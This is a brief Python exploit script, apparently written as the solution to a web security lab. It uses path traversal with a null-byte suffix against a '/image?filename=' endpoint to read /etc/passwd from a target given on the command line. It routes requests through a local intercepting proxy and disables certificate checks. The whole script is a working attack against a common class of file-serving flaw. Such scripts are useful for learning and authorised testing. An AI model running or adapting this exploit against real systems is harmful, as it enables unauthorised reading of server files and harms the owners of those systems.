import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_password(url):
    print("(+) Trying to access /etc/passwd file...")
    passwd_access_url = url + "/image?filename=../../../etc/passwd%00.jpg"
    res = requests.get(passwd_access_url, verify=False, proxies=proxies)
    if "root:x" in res.text:
        print("(+) Successfully exploited and accessed /etc/passwd")
        print("(+) Content of /etc/passwd is:-")
        print(res.text)
    else:
        print("(+) Could not access /etc/passwd file")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} <url>")
        print(f"(+) Example: python {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    print('(+) Exploiting directory traversal vulnerabilities...')
    access_password(url)

if __name__ == "__main__":
    main()